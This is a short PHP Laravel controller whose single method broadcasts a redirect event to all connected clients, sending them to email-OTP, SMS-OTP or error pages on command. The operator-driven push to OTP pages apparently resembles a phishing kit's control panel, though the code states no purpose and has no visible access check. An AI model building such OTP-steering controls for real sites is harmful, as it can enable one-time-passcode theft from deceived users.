<?php

namespace App\Http\Controllers;

use App\Events\RedirectCommand;
use Illuminate\Http\Request;

class CommandController extends Controller
{
    public function triggerRedirectCommand(Request $request)
        {

            $command = $request->input('command');
            // Broadcast the redirect command to all connected clients
            if($command == 'email-otp'){
                event(new RedirectCommand('email-otp'));
            }
            elseif($command =='sms-otp-page'){
                event(new RedirectCommand('sms-otp-page'));
            }
            elseif($command =='error-page'){
                event(new RedirectCommand('error-page'));
            }
            
    
            return response()->json(['success' => true]);
        }
    
}
